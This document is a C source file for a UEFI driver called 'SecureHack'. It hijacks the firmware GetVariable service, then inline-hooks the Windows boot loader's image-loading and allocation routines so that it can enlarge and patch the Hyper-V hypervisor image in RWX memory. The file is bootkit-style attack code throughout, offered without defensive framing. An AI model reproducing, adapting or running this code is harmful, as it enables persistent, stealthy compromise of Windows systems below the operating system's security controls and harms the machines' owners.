#include "Global.h"

const UINT8 _gDriverUnloadImageCount = 1;

const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

CHAR8* gEfiCallerBaseName = "SecureHack";

BOOLEAN HooksInstalled = FALSE;
HookInformation BlLdrLoadImageHook = { 0 };
HookInformation BlImgAllocateImageBufferHook = { 0 };

BOOLEAN ExtendedSize = FALSE;
UINTN PatchedHyperV = FALSE;

EFI_GET_VARIABLE OriginalGetVariable;

EFI_STATUS HookedBlLdrLoadImage(VOID* arg1, VOID* arg2, VOID* arg3, VOID* arg4, VOID* arg5, VOID* arg6, VOID* arg7,
    VOID* arg8, VOID* arg9, VOID* arg10, VOID* arg11, VOID* arg12, VOID* arg13, VOID* arg14,
    VOID* arg15, VOID* arg16, VOID* arg17)
{
    /*
     * Called within the application context, do not use any EFI services here.
     */

    const EFI_STATUS status = ((EFI_STATUS(*)(VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*))BlLdrLoadImageHook.Trampoline)(
        arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17);

    if (EFI_ERROR(status))
        return status;

    CHAR16* imagePath = (CHAR16*)arg3;
    CHAR16* imageName = (CHAR16*)arg4;

    if (!imagePath || !imageName)
        return status;

    const PLDR_DATA_TABLE_ENTRY entry = *(PPLDR_DATA_TABLE_ENTRY)arg9;

    if (StrCmp(imageName, L"hv.exe"))
        return status;

    if (PatchedHyperV)
        return status;

    PatchedHyperV = TRUE;

    const UINT32 newSize = (UINT32)(entry->SizeOfImage + GetCurrentImageSize());

    DebugFormat("Image %S is being loaded:\n - Path: %S\n - Base: 0x%p\n - Original size: %u\n - Extended size: %u\n", imageName, imagePath, entry->ModuleBase, entry->SizeOfImage, newSize);

    entry->SizeOfImage = newSize;
    NT_HEADERS(entry->ModuleBase)->OptionalHeader.SizeOfImage = newSize;

    ProcessHvImage(entry->ModuleBase);

    return status;
}

UINT64 EFIAPI HookedBlImgAllocateImageBuffer(VOID** imageBuffer, UINTN imageSize, UINT32 memoryType, const UINT32 attributes, VOID* unknown1, VOID* unknown2)
{
    /*
     * First one with this type is the actual allocation:
     * BlImgAllocateImageBuffer(): 0xFFFFF806387AA000 (4276224) (147456)
     * BlLdrLoadImage(): \WINDOWS\system32\hvax64.exe hv.exe 0xFFFFF806387AA000 (4276224)
     * BlImgAllocateImageBuffer(): 0xFFFFF80638BBE000 (77824) (147456)
     * BlLdrLoadImage(): \WINDOWS\system32\hv.exe hv.exe 0xFFFFF806387AA000 (4276224)
     */
    if (attributes == ATTRIBUTE_HV_IMAGE && !ExtendedSize)
    {
        ExtendedSize = TRUE;

        const UINTN originalSize = imageSize;
        const UINTN currentImageSize = GetCurrentImageSize();
        imageSize += currentImageSize;
        memoryType = MEMORY_ATTRIBUTE_RWX;

        DebugFormat("Extended allocation for 0x%p from %ld to %ld (+%ld)\n", imageBuffer, originalSize, imageSize, currentImageSize);
    }

    const UINT64 allocated = ((UINT64(*)(VOID**, UINTN, UINT32, UINT32, VOID*, VOID*))BlImgAllocateImageBufferHook.Trampoline)(
        imageBuffer, imageSize, memoryType, attributes, unknown1, unknown2);

    return allocated;
}

EFI_STATUS EFIAPI HookedGetVariable(CHAR16* variableName, EFI_GUID* vendorGuid, UINT32* attributes, UINTN* dataSize, VOID* data)
{
    if (StrCmp(variableName, L"SetupMode"))
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);

    UINT64 returnAddress = (UINT64)_ReturnAddress();
    while (CompareMem((VOID*)returnAddress, "This program cannot be run in DOS mode", 38) != 0)
    {
        returnAddress--;
    }

    const UINT64 moduleBase = returnAddress - 0x4E;

    const UINT64 loadImage = GetExport((VOID*)moduleBase, "BlLdrLoadImage");
    if (!loadImage)
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);

    const UINT64 allocateImageBuffer = GetExport((VOID*)moduleBase, "BlImgAllocateImageBuffer");
    if (!allocateImageBuffer)
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);

    if (HooksInstalled)
        return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);

    gST->ConOut->SetAttribute(gST->ConOut, EFI_RED | EFI_BACKGROUND_BLACK);
    gST->ConOut->ClearScreen(gST->ConOut);
    Print(L"SecureHack\n");

    gST->ConOut->SetAttribute(gST->ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);
    Print(L"ReturnAddress                -> (phys) 0x%p\n", returnAddress);
    Print(L"BlLdrLoadImage               -> (phys) 0x%p\n", loadImage);
    Print(L"BlImgAllocateImageBuffer     -> (phys) 0x%p\n", allocateImageBuffer);

    BlLdrLoadImageHook = CreateHook((VOID*)loadImage, (VOID*)HookedBlLdrLoadImage);
    if (!EnableHook(&BlLdrLoadImageHook))
    {
        Print(L"Failed to hook BlLdrLoadImage\n");
        INFINITE_LOOP();
    }

    BlImgAllocateImageBufferHook = CreateHook((VOID*)allocateImageBuffer, (VOID*)HookedBlImgAllocateImageBuffer);
    if (!EnableHook(&BlImgAllocateImageBufferHook))
    {
        Print(L"Failed to hook BlImgAllocateImageBuffer\n");
        INFINITE_LOOP();
    }

    HooksInstalled = TRUE;

    Sleep(3);

    return OriginalGetVariable(variableName, vendorGuid, attributes, dataSize, data);
}

VOID* SetServicePointer(EFI_TABLE_HEADER* serviceTableHeader, VOID** serviceTableFunction, VOID* newFunction)
{
    if (!serviceTableFunction || !newFunction || !*serviceTableFunction)
        return NULL;

    ASSERT(gBS != NULL);
    ASSERT(gBS->CalculateCrc32 != NULL);

    CONST EFI_TPL tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);

    VOID* originalFunction = *serviceTableFunction;
    *serviceTableFunction = newFunction;

    serviceTableHeader->CRC32 = 0;
    gBS->CalculateCrc32((UINT8*)serviceTableHeader, serviceTableHeader->HeaderSize, &serviceTableHeader->CRC32);

    gBS->RestoreTPL(tpl);

    return originalFunction;
}

EFI_STATUS EFIAPI UefiUnload(const EFI_HANDLE imageHandle)
{
    UNREFERENCED_PARAMETER(imageHandle);
    return EFI_ACCESS_DENIED;
}

EFI_STATUS EFIAPI UefiMain(const EFI_HANDLE imageHandle, EFI_SYSTEM_TABLE* systemTable)
{
    UNREFERENCED_PARAMETER(imageHandle);
    UNREFERENCED_PARAMETER(systemTable);

    DebugInit(COM1);
    DebugFormat("UefiMain() @ 0x%p\n", (VOID*)UefiMain);

    OriginalGetVariable = (EFI_GET_VARIABLE)SetServicePointer(&gST->Hdr, (VOID**)&gRT->GetVariable, (VOID*)HookedGetVariable);
    Print(L"GetVariable(): 0x%p -> 0x%p\n", OriginalGetVariable, HookedGetVariable);

    return EFI_SUCCESS;
}